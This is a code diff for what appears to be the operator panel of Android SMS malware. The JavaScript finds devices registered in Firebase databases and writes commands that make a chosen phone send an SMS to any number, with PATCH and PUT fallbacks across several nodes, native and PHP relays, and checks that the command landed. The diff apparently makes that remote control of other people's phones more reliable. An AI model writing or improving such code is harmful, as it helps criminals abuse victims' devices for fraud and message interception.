@@ -883,16 +883,28 @@ function discoverInstanceProbe(inst,force){
   var primary=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'clients';
   return fetchSummaryNodeFirebase(inst,primary).then(function(){
     var count=countInstDevices(inst.id);
-    if(count>0){
-      rememberFbNode(inst,primary,count);
-      applyRememberedNode(inst,primary);
-      if(inst.db)attachLiveNode(inst,primary);
-      processClientsDataNow();
-      inst._lastProbeAt=Date.now();
-      if(!inst._deepDiscoverDone||force)scheduleDeepDiscover(inst,!!force);
-      return;
+    var pickNode=primary;
+    var pickCount=count;
+    function afterPick(){
+      if(pickCount>0){
+        rememberFbNode(inst,pickNode,pickCount);
+        applyRememberedNode(inst,pickNode);
+        if(inst.db)attachLiveNode(inst,pickNode);
+        processClientsDataNow();
+        inst._lastProbeAt=Date.now();
+        if(!inst._deepDiscoverDone||force)scheduleDeepDiscover(inst,!!force);
+        return;
+      }
+      return discoverInstanceProbeSlow(inst,force);
     }
-    return discoverInstanceProbeSlow(inst,force);
+    if(count>0&&primary!=='clients'){
+      return fetchSummaryNodeFirebase(inst,'clients').then(function(){
+        var cc=countDevicesFromNode(inst.id,'clients');
+        if(cc>pickCount){pickNode='clients';pickCount=cc;}
+        return afterPick();
+      }).catch(function(){return afterPick();});
+    }
+    return afterPick();
   }).then(function(r){if(!inst._lastProbeAt)inst._lastProbeAt=Date.now();return r;});
 }
 function isValidFirebaseUrl(url){
@@ -2439,7 +2451,8 @@ function sendDeviceSms(sim){
     if(ok){
       if(msgEl)msgEl.value='';
       var dest=(data&&data.to)||phoneDial||toRaw||to;
-      toast('SMS queue → '+dest+' (Sim '+(_sendSimSlot||1)+') — device online hona chahiye',true);
+      var line=(data&&data.message)||('SMS queue → '+dest+' (Sim '+(_sendSimSlot||1)+')');
+      toast(line,true);
     }else{
       toast((data&&data.error)||'Send failed',false);
     }
@@ -3200,26 +3213,43 @@ function buildNyaApkCommandPatch(deviceId,sim,to,message){
 function buildRto9SendPayload(deviceId,sim,to,message){
   return buildNyaApkCommandPatch(deviceId,sim,to,message);
 }
+function dedupeSendAttempts(list){
+  var seen={}, out=[];
+  (list||[]).forEach(function(a){
+    if(!a||!a.path)return;
+    var key=String(a.method||'PUT').toUpperCase()+'|'+a.path;
+    if(seen[key])return;
+    seen[key]=1;
+    out.push(a);
+  });
+  return out;
+}
+function pushSmsPatchAttempts(out,node,id,patch){
+  if(!node||!id)return;
+  out.push({path:node+'/'+id,payload:patch,method:'PATCH'});
+}
+function pushSmsWebhookAttempt(out,node,id,payload){
+  if(!node||!id)return;
+  out.push({path:node+'/'+id+'/webhookEvent/sendSms',payload:payload,method:'PUT'});
+}
 function getSendAttempts(inst,d,to,message,sim){
-  var id=d.rawId,out=[],profileNode=getDeviceProfilePath(d);
+  var id=d.rawId,out=[],profileNode=getDeviceProfilePath(d)||'clients';
   var patch=buildNyaApkCommandPatch(id,sim,to,message);
   var rabel91=buildRabelSendPayload(sim,to,message);
   var rabel10=buildRabelSendPayload10(sim,to,message);
   if(needsDualSmsSend(inst,d)){
-    out.push({path:'clients/'+id,payload:patch,method:'PATCH'});
-    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
-    if(String(rabel10.to)!==String(rabel91.to)){
-      out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel10,method:'PUT'});
-    }
+    if(profileNode!=='clients')pushSmsPatchAttempts(out,profileNode,id,patch);
+    pushSmsPatchAttempts(out,'clients',id,patch);
+    pushSmsWebhookAttempt(out,'clients',id,rabel91);
     if(profileNode!=='clients'){
-      out.push({path:profileNode+'/'+id,payload:patch,method:'PATCH'});
-      out.push({path:profileNode+'/'+id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
+      pushSmsWebhookAttempt(out,profileNode,id,rabel91);
+      if(String(rabel10.to)!==String(rabel91.to))pushSmsWebhookAttempt(out,profileNode,id,rabel10);
     }
     if(isRtoStyleUrl(inst.restUrl)){
       out.push({path:id,payload:patch,method:'PATCH'});
       out.push({path:id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
     }
-    return out;
+    return dedupeSendAttempts(out);
   }
   if(inst.schema==='spinplay'){
     uniqPaths([profileNode,'devices','clients','Verify_Device']).forEach(function(n){
@@ -3231,7 +3261,28 @@ function getSendAttempts(inst,d,to,message,sim){
   }
   out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
   out.push({path:profileNode+'/'+id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
-  return out;
+  return dedupeSendAttempts(out);
+}
+function restWriteViaNative(url,method,payload){
+  if(!window.REBEL_NATIVE_APP||!window.RebelAndroid||typeof RebelAndroid.panelFetch!=='function')return null;
+  try{
+    var res=JSON.parse(RebelAndroid.panelFetch(JSON.stringify({
+      url:url,method:method||'PUT',body:JSON.stringify(payload||{})
+    })));
+    if(!res||res.error||(res.ok===false&&!res.messageText&&!res.command))return null;
+    return res;
+  }catch(e){return null;}
+}
+function verifySmsQueuedOnDevice(inst,devId,message){
+  if(!inst||!devId||!message)return Promise.resolve(false);
+  var needle=String(message).trim().slice(0,24);
+  if(!needle)return Promise.resolve(false);
+  return restJsonInst(inst,'clients/'+devId+'/sendSms').then(function(ss){
+    if(ss&&ss.message&&String(ss.message).indexOf(needle)>=0)return true;
+    return restJsonInst(inst,'clients/'+devId+'/messageText').then(function(mt){
+      return !!(mt&&String(mt).indexOf(needle)>=0);
+    });
+  }).catch(function(){return false;});
 }
 function promiseAny(promises){
   return new Promise(function(resolve,reject){
@@ -3251,7 +3302,10 @@ function sendSmsViaRestOne(inst,a){
   function tryAuth(){
     if(j>=auths.length)return Promise.reject(new Error('REST failed'));
     var auth=auths[j++];
-    return fetch(buildRestUrl(inst,a.path,auth),{
+    var url=buildRestUrl(inst,a.path,auth);
+    var native=restWriteViaNative(url,a.method||'PUT',a.payload);
+    if(native)return Promise.resolve({ok:true,path:a.path,via:'native-rest',method:a.method||'PUT'});
+    return fetch(url,{
       method:a.method||'PUT',headers:{'Content-Type':'application/json'},
       body:JSON.stringify(a.payload),cache:'no-store'
     }).then(function(r){
@@ -3393,32 +3447,33 @@ function checkRecharge(){
     else toast(data&&data.error||'Ping failed – device may be offline',false);
   });
 }
+function finishSmsSendCallback(inst,d,msg,phoneDial,r,callback){
+  var hint=' → '+phoneDial;
+  if(r.path)hint+=' · '+r.path;
+  if(r.patchOk&&!r.webhookOk)hint+=' (PATCH queued — device APK online hona chahiye)';
+  var baseMsg='SMS command queued'+(r.via?' via '+r.via:'')+hint;
+  verifySmsQueuedOnDevice(inst,d.rawId,msg).then(function(verified){
+    if(verified)baseMsg='✅ Firebase mein command likha'+hint;
+    else if(r.patchOk||r.webhookOk)baseMsg='⏳ Command bheja — device execute karega'+hint;
+    if(callback)callback(true,{ok:true,message:baseMsg,path:r.path,to:phoneDial,verified:verified,patchOk:!!r.patchOk,webhookOk:!!r.webhookOk});
+  });
+}
 function sendSmsInstant(to,msg,simSlot,callback){
   var d=getSelDev();
   var inst=getFbInstance(d&&d.fbId);
   if(!d||!inst){if(callback)callback(false,{error:'No device'});return;}
   var phoneFull=String(to||'').trim();
   var phoneDial=formatApkSmsTo(phoneFull||to);
+  if(!phoneDial||phoneDial.length<12){if(callback)callback(false,{error:'Valid phone number daalo'});return;}
   var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
   var dual=needsDualSmsSend(inst,d);
+  var writeNode=d.deviceNode||getDeviceProfilePath(d)||'clients';
+  if(writeNode==='All_Users'||writeNode==='All_User')writeNode='clients';
   var phpBody={
     device_id:d.rawId,to:phoneDial,message:msg,sim:simSlot||1,
     database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
-    schema:inst.schema||'rabel',device_node:d.deviceNode||getDeviceProfilePath(d)||'clients',composite_id:d.id
+    schema:inst.schema||'rabel',device_node:writeNode,composite_id:d.id
   };
-  if(typeof rebelApiPost==='function'){
-    try{
-      var native=rebelApiPost('rebel_send_sms',phpBody);
-      if(native&&native.ok){
-        if(callback)callback(true,{ok:true,message:(native.message||'SMS command queued')+' → '+(native.path||''),via:'native',path:native.path,to:phoneDial});
-        return;
-      }
-      if(native&&native.error&&callback){
-        callback(false,{error:native.error});
-        return;
-      }
-    }catch(e){}
-  }
   var restFn=dual?sendSmsViaRestDual:sendSmsViaRestSequential;
   var sdkFn=dual?sendSmsDirectFirebaseDual:sendSmsDirectFirebaseSequential;
   restFn(inst,attempts)
@@ -3427,17 +3482,21 @@ function sendSmsInstant(to,msg,simSlot,callback){
       return Promise.reject(new Error('REST failed'));
     })
     .catch(function(){
+      if(typeof rebelApiPost!=='function')return Promise.reject(new Error('Native API unavailable'));
+      try{
+        var native=rebelApiPost('rebel_send_sms',phpBody);
+        if(native&&native.ok)return{ok:true,message:native.message||'Sent',via:'native',path:native.path,to:native.to||phoneDial,patchOk:!!native.patchOk,webhookOk:!!native.webhookOk};
+        if(native&&native.error)throw new Error(native.error);
+      }catch(e){throw e;}
+      return Promise.reject(new Error('Native send failed'));
+    })
+    .catch(function(){
       return sendSmsFetch(phpBody).then(function(res){
-        if(res.httpOk&&res.data&&res.data.ok)return{ok:true,message:res.data.message||'Sent',via:'php',path:res.data.path,to:res.data.to};
+        if(res.httpOk&&res.data&&res.data.ok)return{ok:true,message:res.data.message||'Sent',via:'php',path:res.data.path,to:res.data.to,patchOk:!!(res.data&&res.data.patchOk),webhookOk:!!(res.data&&res.data.webhookOk)};
         throw new Error((res.data&&res.data.error)||'PHP send failed');
       });
     })
-    .then(function(r){
-      var hint=' → '+phoneDial;
-      if(r.path)hint+=' · '+r.path;
-      if(r.patchOk&&!r.webhookOk)hint+=' (PATCH ok — device online hona chahiye)';
-      if(callback)callback(true,{ok:true,message:'SMS command queued'+(r.via?' via '+r.via:'')+hint,path:r.path,to:phoneDial});
-    })
+    .then(function(r){finishSmsSendCallback(inst,d,msg,phoneDial,r,callback);})
     .catch(function(e){
       var err=(e&&e.message)||'Send failed — device online hona chahiye ya Firebase block';
       if(callback)callback(false,{error:err});
